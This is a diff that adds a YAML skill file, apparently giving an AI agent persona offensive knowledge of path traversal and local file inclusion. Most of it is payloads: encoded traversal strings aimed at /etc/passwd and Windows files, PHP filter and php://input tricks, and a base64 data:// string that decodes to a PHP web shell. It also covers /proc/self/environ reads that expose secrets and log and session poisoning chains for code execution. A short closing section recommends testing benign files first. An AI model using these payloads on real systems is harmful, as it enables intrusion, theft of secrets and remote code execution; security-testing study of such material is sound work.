@@ -1,0 +1,83 @@
+schema_version: 1
+version: 3.0.0
+name: path-traversal-lfi
+description: Senior Path Traversal, Local File Inclusion (LFI), and PHP stream wrapper assessment — encoding filter evasions, procfs introspection, and log poisoning execution chains.
+triggers:
+  - path traversal
+  - directory traversal
+  - lfi
+  - rfi
+  - local file inclusion
+  - php filter
+  - procfs
+  - log poisoning
+tools:
+  - curl
+knowledge: |
+  Audit file path handling, inclusion routines, and system introspection vectors with senior offensive engineering precision.
+
+  1. PATH TRAVERSAL MECHANICS & ENCODING EVASIONS:
+     When user-supplied file names or paths are concatenated without proper canonicalization:
+     - Standard Relative Traversal:
+       `../../../../etc/passwd` or `..\..\..\..\windows\win.ini`
+     - Double URL Encoding:
+       `%252e%252e%252f` (resolves to `%2e%2e%2f` on first decode, then `../` on second decode)
+     - Non-Recursive Filter Stripping:
+       If the backend replaces `../` with an empty string only once:
+       `....//....//....//etc/passwd` or `..././..././etc/passwd`
+     - Semicolon & Delimiter Tricks:
+       `..;/..;/etc/passwd` (Spring MVC / Tomcat path normalization differences)
+     - Absolute Path Traversal:
+       `/etc/passwd` or `file:///etc/passwd`
+     - Overlong UTF-8 Sequences:
+       `%c0%ae%c0%ae%c0%af` (overlong representation of `../`)
+
+  2. PHP STREAM WRAPPERS & SOURCE EXTRACTION:
+     In PHP applications vulnerable to inclusion (`include()`, `require()`):
+     - Base64 Filter Reading (Arbitrary Source Extraction):
+       Read backend PHP scripts without triggering execution:
+       `php://filter/convert.base64-encode/resource=index.php`
+       `php://filter/read=convert.base64-encode/resource=config.php`
+     - Direct Input Stream (`php://input`):
+       When `allow_url_include = On`, POST raw PHP code in the request body to execute arbitrary commands.
+     - Data Wrapper (`data://`):
+       `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+`
+     - ZIP Archive Wrapper (`zip://`):
+       Upload a valid zip file containing a script and include: `zip:///path/to/archive.zip#payload.php`.
+
+  3. PROCFS SYSTEM INTROSPECTION (LINUX):
+     If arbitrary read allows accessing the Linux pseudo-filesystem `/proc`:
+     - `/proc/self/cmdline`:
+       Discloses the executable name, configuration parameters, and startup flags of the running process.
+     - `/proc/self/environ`:
+       Discloses process environment variables, including runtime configuration tokens and secret parameters.
+     - `/proc/self/fd/0`, `/proc/self/fd/1` ... `/proc/self/fd/X`:
+       Inspect open file descriptors, active network sockets, and temporary unlinked files.
+     - `/proc/version` and `/proc/sys/kernel/hostname`:
+       Extract exact kernel versions and internal hostnames cleanly.
+     - `/proc/net/tcp` and `/proc/net/fib_trie`:
+       Inspect active listening ports and internal routing tables formatted as hex IP/port pairs.
+
+  4. LOG POISONING & SESSION FILE INCLUSION:
+     When LFI cannot reach target application source files directly:
+     - Web Server Access Log Poisoning:
+       1. Inject PHP payload into HTTP request headers (e.g. `User-Agent: <?php phpinfo(); ?>`).
+       2. Include the web server access log:
+          `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/httpd/access_log`.
+     - SSH Auth Log Poisoning:
+       Log in via SSH with a payload as username: `ssh '<?php phpinfo(); ?>'@<target_ip>`.
+       Include the authentication log: `/var/log/auth.log` or `/var/log/secure`.
+     - PHP Session File Poisoning:
+       If the session cookie controls session data:
+       Store payload in session variable, then include session file: `/var/lib/php/sessions/sess_<cookie_value>`.
+
+  5. SAFE VERIFICATION METHODOLOGY:
+     - Always test with benign operating system files first:
+       Linux: `/etc/issue`, `/etc/hosts`, `/proc/sys/kernel/hostname`.
+       Windows: `C:\windows\win.ini`, `C:\windows\system32\drivers\etc\hosts`.
+     - Document the exact traversal path, parameter name, encoding variant, and verified output.
+references:
+  - persona:path-traversal-lfi-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/path-traversal-lfi.yaml
